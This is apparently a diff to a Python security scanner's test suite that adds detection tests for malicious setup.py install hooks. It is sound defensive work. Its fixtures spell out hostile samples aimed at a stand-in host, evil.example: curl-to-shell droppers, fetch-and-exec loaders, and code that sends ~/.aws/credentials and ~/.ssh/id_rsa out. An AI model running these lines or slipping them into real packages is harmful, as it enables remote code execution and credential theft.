@@ -7,6 +7,7 @@ from security_scanner.source_analysis import (
     detect_dependency_risks,
     detect_embedded_payloads,
     detect_indirect_exec,
+    detect_install_hooks,
     detect_obfuscation,
     detect_secrets,
     detect_suspicious_imports,
@@ -346,10 +347,119 @@ def test_detect_postinstall_script():
     assert any("postinstall" in o.category for o in obs)
 
 
-def test_detect_setup_py_cmdclass():
-    content = "setup(cmdclass={'install': CustomInstall})"
-    obs = detect_dependency_risks(content, "setup.py")
-    assert any("custom_install" in o.category for o in obs)
+def test_install_dropper_curl_pipe_shell():
+    """setup.py that pipes a downloaded script into a shell is a HIGH dropper."""
+    content = (
+        "from setuptools import setup\n"
+        "import os\n"
+        "os.system('curl -s https://evil.example/i.sh | sudo bash')\n"
+        "setup(name='x')\n"
+    )
+    obs = detect_install_hooks(content, "setup.py")
+    assert any(o.category == "supply_chain:install_dropper" for o in obs)
+    assert any(o.severity == ObservationSeverity.HIGH for o in obs)
+
+
+def test_install_dropper_download_and_exec():
+    """setup.py that fetches remote content and exec()s it is a HIGH dropper."""
+    content = (
+        "from setuptools import setup\n"
+        "import urllib.request\n"
+        "payload = urllib.request.urlopen('https://evil.example/p').read()\n"
+        "exec(payload)\n"
+        "setup(name='x')\n"
+    )
+    obs = detect_install_hooks(content, "setup.py")
+    assert any(o.category == "supply_chain:install_dropper" for o in obs)
+
+
+def test_install_dropper_ignores_native_build_subprocess():
+    """A legitimate native-build setup.py (subprocess list-form, no fetch) is clean.
+
+    This is the false-positive guard: many real packages drive cmake/compilers
+    from setup.py via subprocess. That alone must not read as a dropper.
+    """
+    content = (
+        "from setuptools import setup\n"
+        "import subprocess\n"
+        "subprocess.check_call(['cmake', '--build', '.'])\n"
+        "setup(name='x')\n"
+    )
+    obs = detect_install_hooks(content, "setup.py")
+    assert not obs
+
+
+def test_install_dropper_only_fires_on_setup_py():
+    """The dropper check is scoped to install scripts, not arbitrary modules."""
+    content = "import urllib.request\nexec(urllib.request.urlopen('http://x').read())\n"
+    assert detect_install_hooks(content, "app.py") == []
+
+
+def test_install_dropper_ignores_download_then_shell_unpack():
+    """FP guard: fetch an artifact then `os.system('tar ...')` is a benign pattern.
+
+    Downloading a prebuilt binary/weights and shelling out to unpack/chmod it is
+    common in legitimate setup.py. A fetch paired with a shell call (not in-process
+    exec/eval) must NOT read as a dropper -- only `curl | sh` style does.
+    """
+    content = (
+        "from setuptools import setup\n"
+        "import os, urllib.request\n"
+        "urllib.request.urlretrieve('https://cdn.example/lib.tar.gz', 'lib.tar.gz')\n"
+        "os.system('tar xzf lib.tar.gz -C build/')\n"
+        "setup(name='x')\n"
+    )
+    assert detect_install_hooks(content, "setup.py") == []
+
+
+def test_install_dropper_curl_pipe_interpreter():
+    """`curl ... | python` is the same RCE as `curl ... | sh`."""
+    content = (
+        "import os\n"
+        "os.system('curl -s https://evil.example/x | python3')\n"
+    )
+    obs = detect_install_hooks(content, "setup.py")
+    assert any(o.category == "supply_chain:install_dropper" for o in obs)
+
+
+def test_install_dropper_post_fetch_and_exec():
+    """Fetch via POST + exec is caught (POST is in the fetch set)."""
+    content = (
+        "import requests\n"
+        "exec(requests.post('https://evil.example/c').text)\n"
+    )
+    obs = detect_install_hooks(content, "setup.py")
+    assert any(o.category == "supply_chain:install_dropper" for o in obs)
+
+
+def test_install_hook_credential_exfil_is_high():
+    """Credential read + exfil inside setup.py runs at install -> HIGH, not MEDIUM."""
+    content = (
+        "import os, urllib.request, base64\n"
+        "home = os.path.expanduser('~')\n"
+        "data = open(os.path.join(home, '.aws/credentials')).read()\n"
+        "data += open(os.path.join(home, '.ssh/id_rsa')).read()\n"
+        "urllib.request.urlopen('https://evil.example/c', data=base64.b64encode(data.encode()))\n"
+    )
+    obs = detect_behavioral_patterns(content, "setup.py")
+    cred = [o for o in obs if "credential" in o.category]
+    assert cred and cred[0].category == "behavioral:install_hook_credential_exfil"
+    assert cred[0].severity == ObservationSeverity.HIGH
+
+
+def test_credential_exfil_in_module_stays_medium():
+    """The same pattern in an ordinary module only runs if called -> MEDIUM."""
+    content = (
+        "import os, urllib.request, base64\n"
+        "home = os.path.expanduser('~')\n"
+        "data = open(os.path.join(home, '.aws/credentials')).read()\n"
+        "data += open(os.path.join(home, '.ssh/id_rsa')).read()\n"
+        "urllib.request.urlopen('https://evil.example/c', data=base64.b64encode(data.encode()))\n"
+    )
+    obs = detect_behavioral_patterns(content, "mypkg/client.py")
+    cred = [o for o in obs if "credential" in o.category]
+    assert cred and cred[0].category == "behavioral:credential_access_exfil"
+    assert cred[0].severity == ObservationSeverity.MEDIUM
 
 
 def test_legitimate_deps_no_typosquat():
